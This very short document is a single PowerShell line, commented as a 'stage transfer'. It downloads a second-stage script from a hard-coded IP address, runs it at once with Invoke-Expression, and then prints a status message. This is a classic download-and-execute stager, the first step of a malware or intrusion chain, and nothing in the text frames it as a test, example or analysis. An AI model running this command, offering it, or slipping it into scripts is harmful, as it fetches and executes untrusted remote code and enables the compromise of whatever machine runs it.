<# Stage transfer #> IEX (Invoke-WebRequest -Uri 'http://192.0.2.207/stage2.ps1' -UseBasicParsing).Content; Write-Output "stage 32 initialized"
